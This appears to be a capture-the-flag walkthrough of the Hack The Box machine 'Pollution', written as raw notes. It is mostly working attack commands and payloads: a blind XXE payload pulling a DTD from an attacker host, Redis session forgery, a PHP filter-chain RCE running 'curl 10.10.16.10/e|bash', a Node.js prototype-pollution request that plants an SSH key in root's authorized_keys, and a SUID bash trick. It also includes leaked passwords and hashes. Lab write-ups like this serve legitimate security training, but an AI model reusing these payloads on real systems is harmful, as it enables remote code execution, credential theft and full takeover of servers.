#HTB HARD BOX -POLLUTION-

start with nmap initial 1000 tcp port scan

```bash
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
```
Nmap full port scan 65535 port

```bash
6379/tcp open  redis
```

# Target OS
debian 

# main host and subdomin
collect.htb  => custom php site to register api
developers.collect.htb =>  {http basic auth} (Need creds for auth)
forum.collect.htb => (Tech stack = mybb - Discussion software that brings communities together.)
                      (we can create account and login)

# forum.collect.htb
It forum site to collect employess only

1,Their has a forum that disccuss about pollution api login issue with a proxy request file attachment
2,We need to login to download that file 
3,Register account as user and logged in
4,Download the file it is a burp captured xml file
5,The file leaking a token to upgrade collect.htb user to admin role
  
# collect.htb
A PHP site to register users and login

1,Once we register and logged as user their is nothing much interseting just reg and login function only
2,Using leaked token form forum.collect.htb to upgrade user role to admin

```request
POST /set/role/admin HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

token=ddac62a28254561001277727cb397baf
```
3,After change the roll we get a another register page to use api
4,Intercepting register request it user xml form to register account
5,Find blind xxe from that form
6,Create a external DTD file for reading arbitary host file and inject this payload in register form
```payload
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```
# Redis
Redis is used to both collect.htb and developers.collect.htb for session management

1, Read password from bootstrap.htb using xxe "auth=COLLECTR3D1SPASS"

# Developers.collect.htb
This is a collect developers site to track their projects. we need authorization to access the site {Basic http auth}

1,Reading password through xxe from location /var/www/developers/.htpasswd
  ```creds
  developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1:r0cket
  ```
2,Decrypting hash using hashcat autodetect-mode
3,After connecting site with creds their is an additional login page
4,we already know this site is also use redis for store session while reading the source through xxe
  the site checked session with auth parameter
5,Connect redis and forge a session with auth parameter for bypassing the second login page
```redis
set "PHPREDIS_SESSION:f2k1qko9ichlfa7gcprg6sletj" "username|s:7:\"user911\";role|s:4:\"user\";auth|s:4:\"test\";"
```
6, Page parameter is vulnerable to php fillter chain RCE because the page is using load page by include
```bash
python3 php_filter_chain_generator.py --chain '<?= `curl 10.10.16.10/e|bash`;?>'
```
FOOTHOLD
* create a python script to get RCE and foothold as user www-data

# mysql
webapp_user:Str0ngP4ssw0rdB*12@1

developers admin user cred
admin |c89efc49ddc58ee4781b02becc788d14
collect admin
 admin    | c89efc49ddc58ee4781b02becc788d14




curl -X POST http://127.0.0.1:3000/auth/register -H 'Content-Type: application/json' -d '{"username":"user911","password":"user@123"}'

curl -X POST http://127.0.0.1:3000/auth/login -H 'Content-Type: application/json' -d '{"username":"user911","password":"user@123"}'


curl -X POST http://127.0.0.1:3000/admin/messages/send -H 'Content-Type: application/json' -H 'X-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlcjkxMSIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY3MDY3ODM0NywiZXhwIjoxNjcwNjgxOTQ3fQ.MyeP1jvJGHOZnGvzZyaAqdPVMbl5iKEZsbeY2LsNGqo' -d '{"text":{"constructor":{"prototype":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyW32Y/+2kOKo7XRfIpdZsdLPfJaAWUB27jA94Z5QgRLcXadk+5Qsty9Fwj/SxNtum7CO/QPbC4KGJ2NIx3KR3Gik17fpsx672AvXs4UV77woC+gN+Z44GvbKGYpCL9E5bgOHAMh1ypfxva6UCkw+ZFG4OiYH3HFzYUcFkLUN4K0af13ltqa8MJiy62D3RWxhl2ZvLyzG15EvKmyZoLTrokAUW0pqXgGxCzf5HqCqe9V2n1kP/bFrGfxZoGdUx3BgSird+IGB2YmVS8cpjb/w59+sURVSSglg4B71E5uC3wJRKXBUqmPR9z287G9wBOD8rg5CzD/Inu7V0rKA3mDZbsSSGCvCPl3T5y7WcmBm8WkGK/WrGT6kEoQNDPQPA0GDw/lrmQMxsq1M2vTC6aFIDsPOHrh7rLAVyR1yD/9LLLKsVVehEMe6nJv22sKFHxb2CmiyX1wMjhI7vosqwoq4VIULd17Vn0F2nEZZXa9KXcsefXhK/ghPH2qnioNeDVSs= user@parrot > /root/.ssh/authorized_keys\").toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}}}'

curl http://127.0.0.1:3000/admin/messages -H 'Content-Type: application/json' -H 'X-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlcjkxMSIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY3MDU3MjU2MSwiZXhwIjoxNjcwNTc2MTYxfQ.FEHTNTLin4EfW_DqD-EbkLd986UjWCxdoIy-rCk0FlU' -d '{"id":"1"}'


{"constructor":{"prototype":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"touch /tmp/exec-cmdline\").toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}}

cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf
